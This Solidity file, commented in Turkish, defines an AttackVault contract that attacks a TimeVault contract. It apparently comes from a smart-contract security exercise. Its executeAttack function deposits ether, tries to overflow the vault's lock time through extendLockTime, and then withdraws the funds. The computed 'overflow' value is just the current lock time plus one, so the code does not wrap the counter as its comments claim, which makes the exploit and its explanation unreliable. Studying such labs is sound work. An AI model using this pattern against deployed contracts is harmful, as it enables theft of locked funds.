// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

// TimeVault kontratını import ediyoruz, bu kontrat saldırıya uğrayacak hedef kontrat olacak.
import "contracts/TimeVault.sol";

contract AttackVault {
    // AttackVault kontratının içinde, TimeVault kontratına bir referans.
    TimeVault public timeVault;

    // AttackVault kontratının constructor fonksiyonu, hedef kontratı (TimeVault) alır.
    // Bu, saldırganın hangi TimeVault kontratına saldırı yapacağını belirler.
    constructor(TimeVault _timeVault) {
        timeVault = _timeVault;  // TimeVault kontratını saldırgan kontratına bağlar.
    }

    // fallback fonksiyonu, gönderilen ether'ı almak için kullanılabilir.
    // Bu fonksiyon, bir veri olmayan ether gönderildiğinde çağrılır.
    fallback() external payable {}

    // receive fonksiyonu, sadece ether alacak şekilde kullanılır.
    // receive fonksiyonu, sadece ether alırken çağrılır.
    receive() external payable {}

    // Bu fonksiyon saldırı işlemlerini gerçekleştirir.
    function executeAttack() public payable {
        // TimeVault kontratına ether yatırılır (msg.value).
        // Bu işlem, saldırganın kontrata ether göndermesini sağlar.
        timeVault.deposit{value: msg.value}();

        // attackVault kontratındaki lockTime değerini almak için TimeVault'tan çağrı yapıyoruz.
        uint256 currentLockTime = timeVault.lockTime(address(this));

        // currentLockTime üzerine 1 ekleyerek taşma (overflow) değerini oluşturuyoruz.
        // Bu, lockTime değişkeninin taşmasını sağlayacak bir işlem.
        uint256 overflowAmount = currentLockTime + 1;

        // extendLockTime fonksiyonu çağrılarak, lockTime'ı taşır ve çok büyük bir değere çıkarır.
        // Bu, aslında kilitleme süresinin geçerliliğini etkisiz hale getirir.
        timeVault.extendLockTime(overflowAmount);

        // Son olarak, withdraw fonksiyonu çağrılır.
        // Saldırgan, extendLockTime fonksiyonu ile lockTime'ı geçersiz kıldığı için, 
        // withdraw fonksiyonu başarılı bir şekilde çalışır ve ether'ı çekmeye çalışır.
        timeVault.withdraw();
    }
}

